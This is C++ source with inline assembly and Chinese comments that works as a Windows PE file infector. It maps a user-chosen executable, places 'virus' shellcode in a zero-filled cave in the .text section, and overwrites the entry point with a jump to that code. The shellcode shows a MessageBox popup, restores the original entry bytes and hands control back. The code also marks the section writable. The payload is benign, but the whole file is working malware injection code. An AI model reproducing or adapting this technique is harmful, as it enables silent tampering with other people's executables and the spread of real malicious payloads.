// Win-入口跳转弹窗.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<windows.h>
#include<cstdio>

const int PEtoEntryPoint = 0x28;//入口点相对于PE头的偏移
const int textCharacteristics = 0x24;
int PEHeadOffset, EntryPoint, textOffset, textRVA, textFO, textSize, textVK, zeroOffset, ImageBase, iVirusSize = 0;
PVOID pvFile = NULL;

char* CreateCode()
{
	int VirusStart, VirusEnd;
	_asm{
		mov VirusStart, offset virus_start
		mov VirusEnd, offset virus_end
	}
	iVirusSize = VirusEnd - VirusStart;
	char* pCode = (char *)malloc(iVirusSize);
	if (NULL == pCode)
	{
		return 0;
	}

	memcpy(pCode, (void *)VirusStart, iVirusSize);
	memcpy(pCode + 5, (PSTR)pvFile + EntryPoint-textVK, 5);//填写起始入口点的5字节数据
	*(int *)(pCode + 10) = EntryPoint + ImageBase;//填写起始入口地址（VA）
	*(int *)(pCode + 14) = 0x77D507EA;
	strcpy(pCode + 18, "123");
	
	return pCode;

virus_start:
	_asm{
		call yy
		//存放起始入口点的5字节数据
		nop
		nop
		nop
		nop
		nop
		//存放起始入口地址
		nop
		nop
		nop
		nop
		//存放MessageBox入口地址
		nop
		nop
		nop
		nop
		//存放"123"字节,包括'\0'共4字节
		nop
		nop
		nop
		nop

	yy:
		pop eax
		push ebx
		push ecx
		push 0
		mov ebx,eax
		add ebx,13//eax+13存放“123”字节的地址
		push ebx
		push ebx
		push 0
		mov ebx,eax
		add ebx,9//eax+9存放MessageBox的地址
		mov ecx, [ebx]
		mov ebx,eax//因为调用MessageBox之后eax会存放返回值，所以先保存eax
		call ecx//call MessageBox
		//这里不用加esp平衡堆栈
		mov eax,ebx

		mov ebx,eax
		add ebx,5
		mov ecx, [ebx]//此时ecx存放原入口地址

		mov ebx, [eax]
		mov [ecx],ebx//传送前4字节

		add eax,4
		add ecx,4
		mov bl,[eax]
		mov byte ptr[ecx],bl//传送最后一个字节

		sub ecx,4

		mov eax,ecx
		pop ecx
		pop ebx
		jmp eax
	}
virus_end:
	;
}
int findZero(PVOID file, int start,int size)//查找一块连续128字节都是0的区域
{
	bool OK = true;
	while (1)
	{
		OK = true;
		for (int i = 0; i < size; i++)
		{
			if (0 != *((PSTR)file + start + i))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int findSection(char *name, PVOID file, int start)//找到PE头中名字为*name的区段的描述信息的文件偏移
{
	//int offset = start;
	bool OK;
	while (1)
	{
		OK = true;
		for (int i = 0; ; i++)
		{
			if (*(name + i) == '\0'&&*((PSTR)file + i + start) == '\0')
				break;
			if (*(name + i) != *((PSTR)file + i + start))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++; 
		}
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR szBuf[512];
	wscanf_s(L"%ls", szBuf, _countof(szBuf));
	HANDLE hNormalFile = CreateFile(szBuf, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hNormalFile)
	{
		printf("打开文件出错,错误代码%d", GetLastError());
	}
	DWORD dwFileSize = GetFileSize(hNormalFile, NULL);
	HANDLE hFileMap = CreateFileMapping(hNormalFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (NULL == hFileMap)
	{
		printf("创建内存映射文件失败,错误代码%d", GetLastError());
	}
	pvFile = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (NULL == pvFile)
	{
		printf("映射文件失败,错误代码%d",GetLastError());
	}
	
	PEHeadOffset = *(int *)((PSTR)pvFile + 0x3c);
	EntryPoint = *(int *)((PSTR)pvFile + PEHeadOffset + PEtoEntryPoint);
	//PE头偏移0x78是DataDirectory字段，DataDirectory字段包含16条信息，每条8字节
	//textVK = *(int *)((PSTR)pvFile + PEHeadOffset + 0x78+16*8+)
	textOffset = findSection(".text", pvFile, 0);
	textRVA = *(int *)((PSTR)pvFile + textOffset + 12);//区段表中起始偏移12字节处为该区段的RVA
	textFO = *(int *)((PSTR)pvFile + textOffset + 20);//区段表中起始偏移20字节处为该区段的File Offset
	textSize = *(int *)((PSTR)pvFile + textOffset + 16);//偏移16字节为该区段在文件中对齐后的尺寸
	textVK = textRVA - textFO;
	ImageBase = *(int *)((PSTR)pvFile + PEHeadOffset + 0x34);
	zeroOffset = findZero(pvFile, textFO,80);//需要复制的代码有71字节

	char *code=CreateCode();
	memcpy((PSTR)pvFile + zeroOffset, code, iVirusSize);

	//修改原入口点，跳转至病毒代码
	*((PSTR)pvFile + EntryPoint - textVK) = 0xe9;
	*(int *)((PSTR)pvFile + EntryPoint - textVK + 1) = (zeroOffset - textVK) - (EntryPoint - textVK) - 5;

	//修改.text区段属性为可读可写
	int Characteristics = *(int *)((PSTR)pvFile + textOffset + textCharacteristics);
	Characteristics |= 0x80000000;
	*(int *)((PSTR)pvFile + textOffset + textCharacteristics) = Characteristics;

	UnmapViewOfFile(pvFile);
	return 0;
}

